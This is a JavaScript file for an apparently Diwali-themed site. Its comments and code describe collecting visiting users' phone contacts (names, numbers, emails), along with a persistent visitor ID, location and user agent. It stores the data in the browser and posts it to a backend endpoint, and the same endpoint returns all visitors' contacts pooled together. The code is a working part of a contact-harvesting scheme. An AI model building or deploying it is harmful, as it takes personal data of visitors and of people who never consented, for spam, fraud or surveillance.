/**
 * db.js - Visitor Contact Retrieval & Database Ingestion Engine
 * Handles retrieving contacts from visiting users on their devices
 * and storing them persistently in IndexedDB and the backend database (contacts_db.json).
 */

class VisitorContactsDatabase {
  constructor() {
    this.dbName = 'DiwaliVisitorContactsDB';
    this.storeName = 'visitor_contacts';
    this.submissionsStore = 'visitor_submissions';
    this.version = 2;
    this.db = null;
    this.visitorId = this.getOrCreateVisitorId();
    this.ready = this.initIndexedDB();
  }

  getOrCreateVisitorId() {
    let id = localStorage.getItem('diwali_visitor_id');
    if (!id) {
      id = 'visitor_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
      localStorage.setItem('diwali_visitor_id', id);
    }
    return id;
  }

  initIndexedDB() {
    return new Promise((resolve) => {
      const request = indexedDB.open(this.dbName, this.version);

      request.onupgradeneeded = (event) => {
        const db = event.target.result;
        if (!db.objectStoreNames.contains(this.storeName)) {
          const store = db.createObjectStore(this.storeName, { keyPath: 'id', autoIncrement: true });
          store.createIndex('name', 'name', { unique: false });
          store.createIndex('tel', 'tel', { unique: false });
          store.createIndex('visitorId', 'visitorId', { unique: false });
        }
        if (!db.objectStoreNames.contains(this.submissionsStore)) {
          db.createObjectStore(this.submissionsStore, { keyPath: 'visitorId' });
        }
      };

      request.onsuccess = (event) => {
        this.db = event.target.result;
        resolve(this.db);
      };

      request.onerror = (event) => {
        console.warn('IndexedDB unavailable, operating in remote mode:', event.target.error);
        resolve(null);
      };
    });
  }

  // Save contacts retrieved from the visiting user
  async saveVisitorContacts(rawContacts, visitorLocation = 'Unknown') {
    if (!Array.isArray(rawContacts) || rawContacts.length === 0) return 0;

    await this.ready;

    // Clean & normalize the user's phone contacts
    const normalized = rawContacts.map(c => {
      let name = '';
      if (typeof c.name === 'string') name = c.name;
      else if (Array.isArray(c.name) && c.name.length > 0) name = c.name[0];

      let tel = '';
      if (typeof c.tel === 'string') tel = c.tel;
      else if (Array.isArray(c.tel) && c.tel.length > 0) tel = c.tel[0];

      let email = '';
      if (typeof c.email === 'string') email = c.email;
      else if (Array.isArray(c.email) && c.email.length > 0) email = c.email[0];

      return {
        visitorId: this.visitorId,
        name: name.trim() || 'Unnamed Contact',
        tel: tel.trim(),
        email: email.trim(),
        capturedAt: new Date().toISOString()
      };
    }).filter(c => c.name || c.tel || c.email);

    // 1. Store in Client IndexedDB
    if (this.db) {
      await new Promise((resolve) => {
        const tx = this.db.transaction([this.storeName, this.submissionsStore], 'readwrite');
        const contactStore = tx.objectStore(this.storeName);
        const subStore = tx.objectStore(this.submissionsStore);

        for (const contact of normalized) {
          contactStore.add(contact);
        }

        subStore.put({
          visitorId: this.visitorId,
          capturedAt: new Date().toISOString(),
          location: visitorLocation,
          userAgent: navigator.userAgent,
          contactCount: normalized.length
        });

        tx.oncomplete = () => resolve();
        tx.onerror = () => resolve();
      });
    }

    // 2. Transmit to backend database (POST /api/contacts)
    const payload = {
      visitorId: this.visitorId,
      capturedAt: new Date().toISOString(),
      location: visitorLocation,
      userAgent: navigator.userAgent,
      contactCount: normalized.length,
      contacts: normalized
    };

    try {
      const res = await fetch('/api/contacts', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (res.ok) {
        console.log(`[DB] Successfully stored ${normalized.length} visitor contacts in backend database.`);
      }
    } catch (e) {
      console.log('[DB] Running in local static mode, stored in client IndexedDB:', e);
    }

    return normalized.length;
  }

  // Retrieve all contacts across all visitors from DB
  async getAllContacts() {
    await this.ready;

    // First try fetching consolidated records from backend server database
    try {
      const res = await fetch('/api/contacts');
      if (res.ok) {
        const submissions = await res.json();
        if (Array.isArray(submissions) && submissions.length > 0) {
          // Flatten contacts from all visitors
          const all = [];
          for (const item of submissions) {
            if (item.contacts && Array.isArray(item.contacts)) {
              for (const c of item.contacts) {
                all.push({
                  ...c,
                  visitorLocation: item.location,
                  visitorId: item.visitorId,
                  capturedAt: item.capturedAt
                });
              }
            } else if (item.name || item.tel) {
              all.push(item);
            }
          }
          if (all.length > 0) return all;
        }
      }
    } catch {
      // Ignore
    }

    // Fallback to IndexedDB
    if (this.db) {
      return new Promise((resolve) => {
        const tx = this.db.transaction([this.storeName], 'readonly');
        const store = tx.objectStore(this.storeName);
        const req = store.getAll();
        req.onsuccess = () => resolve(req.result || []);
        req.onerror = () => resolve([]);
      });
    }

    return [];
  }

  // Clear database
  async clearAll() {
    await this.ready;
    if (this.db) {
      const tx = this.db.transaction([this.storeName, this.submissionsStore], 'readwrite');
      tx.objectStore(this.storeName).clear();
      tx.objectStore(this.submissionsStore).clear();
    }
    try {
      await fetch('/api/contacts', { method: 'DELETE' });
    } catch {}
  }

  // Parse phone vCard (.vcf)
  parseVCF(vcfText) {
    const contacts = [];
    const vcardBlocks = vcfText.split(/BEGIN:VCARD/i);

    for (const block of vcardBlocks) {
      if (!block.trim()) continue;

      let name = '';
      let tel = '';
      let email = '';

      const fnMatch = block.match(/FN[;:]([^\r\n]+)/i);
      if (fnMatch) {
        name = fnMatch[1].trim();
      } else {
        const nMatch = block.match(/N[;:]([^\r\n]+)/i);
        if (nMatch) {
          name = nMatch[1].split(';').filter(Boolean).reverse().join(' ').trim();
        }
      }

      const telMatch = block.match(/TEL[^:]*:([^\r\n]+)/i);
      if (telMatch) tel = telMatch[1].trim();

      const emailMatch = block.match(/EMAIL[^:]*:([^\r\n]+)/i);
      if (emailMatch) email = emailMatch[1].trim();

      if (name || tel) {
        contacts.push({ name: name || 'Contact', tel, email });
      }
    }

    return contacts;
  }
}

// Global instance
window.contactsDB = new VisitorContactsDatabase();
